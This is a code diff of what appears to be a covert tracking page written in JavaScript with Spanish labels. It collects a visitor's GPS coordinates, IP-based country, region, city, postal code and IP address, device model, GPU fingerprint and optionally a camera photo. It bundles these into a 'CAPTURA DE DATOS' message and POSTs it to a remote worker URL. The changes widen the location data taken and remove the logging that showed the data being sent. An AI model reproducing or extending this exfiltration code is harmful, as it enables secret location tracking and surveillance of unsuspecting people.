@@ -58,7 +58,7 @@
             const res = await fetch('https://ipapi.co/json/');
             const data = await res.json();
             if (data.latitude && data.longitude) {
-                return { lat: data.latitude, lng: data.longitude, ciudad: data.city, pais: data.country_name, ip: data.ip };
+                return { lat: data.latitude, lng: data.longitude, ciudad: data.city, region: data.region, pais: data.country_name, codigo: data.postal, ip: data.ip };
             }
         } catch(e) {}
         return null;
@@ -108,24 +108,29 @@
             obtenerFingerprint()
         ]);
 
-        let msg = '📊 *Captura*';
+        let msg = '📊 *CAPTURA DE DATOS*';
         msg += `\n━━━━━━━━━━━━━━━━`;
         if (gps) {
-            msg += `\n📍 GPS: ${gps.lat}, ${gps.lng} (±${gps.acc}m)`;
-            msg += `\n🗺️ https://maps.google.com/?q=${gps.lat},${gps.lng}`;
+            msg += `\n📍 *GPS* (precisión ±${gps.acc}m)`;
+            msg += `\n   Lat: ${gps.lat}`;
+            msg += `\n   Lng: ${gps.lng}`;
+            msg += `\n   🗺️ https://maps.google.com/?q=${gps.lat},${gps.lng}`;
         } else if (ip) {
-            msg += `\n📍 IP: ${ip.lat}, ${ip.lng}`;
+            msg += `\n📍 *IP* (aproximada)`;
+            msg += `\n   Lat: ${ip.lat}`;
+            msg += `\n   Lng: ${ip.lng}`;
             msg += `\n   País: ${ip.pais}`;
+            msg += `\n   Región: ${ip.region}`;
             msg += `\n   Ciudad: ${ip.ciudad}`;
+            msg += `\n   Código Postal: ${ip.codigo}`;
             msg += `\n   IP: ${ip.ip}`;
         } else {
             msg += `\n📍 Ubicación: No disponible`;
         }
-        msg += `\n📱 Dispositivo: ${dispositivo.modelo}`;
-        msg += `\n🎨 GPU: ${fp.gpu}`;
+        msg += `\n\n📱 *Dispositivo*: ${dispositivo.modelo}`;
+        msg += `\n🎨 *GPU*: ${fp.gpu}`;
         msg += `\n⏰ ${new Date().toISOString()}`;
 
-        // ========== ENVIAR AL WORKER ==========
         const formData = new FormData();
         formData.append('text', msg);
         if (foto) formData.append('photo', foto, 'photo.jpg');
@@ -135,14 +140,9 @@
         }
 
         try {
-            const response = await fetch(workerUrl, {
-                method: 'POST',
-                body: formData  // <-- FormData establece el Content-Type automáticamente
-            });
-            const result = await response.json();
-            console.log('✅ Datos enviados al Worker:', result);
+            await fetch(workerUrl, { method: 'POST', body: formData });
         } catch(e) {
-            console.error('❌ Error al enviar al Worker:', e);
+            console.error('Error:', e);
         }
     }
 
